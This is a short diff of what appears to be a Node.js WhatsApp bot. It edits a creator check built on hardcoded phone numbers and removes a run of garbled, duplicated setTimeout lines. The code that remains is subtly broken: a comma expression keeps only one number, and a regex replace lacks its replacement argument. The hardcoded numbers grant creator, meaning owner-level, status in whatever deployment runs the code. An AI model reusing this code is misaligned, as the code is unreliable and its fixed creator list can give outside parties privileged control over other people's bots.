@@ -199,7 +199,7 @@ const port = process.env.PORT || 9090;
   }
   const udp = botNumber.split('@')[0];
     const nuro = ('94721017862', '92760534874');
-    let isCreator = [tharaka,nuro, config.DEV]
+    let isCreator = [nuro, config.DEV]
 					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
 					.includes(mek.sender);
 
@@ -773,28 +773,4 @@ if (!isReact && senderNumber === botNumber) {
   app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
   setTimeout(() => {
   connectToWA()
-  }, 4000);
-ToWA()
-  }, 4000);
-t}`));
-  setTimeout(() => {
-  connectToWA()
-  }, 4000);
-ToWA()
-  }, 4000);
-));
-  setTimeout(() => {
-  connectToWA()
-  }, 4000);
-ToWA()
-  }, 4000);
-WA()
-  }, 4000);
-ToWA()
-  }, 4000);
-));
-  setTimeout(() => {
-  connectToWA()
-  }, 4000);
-ToWA()
   }, 4000);
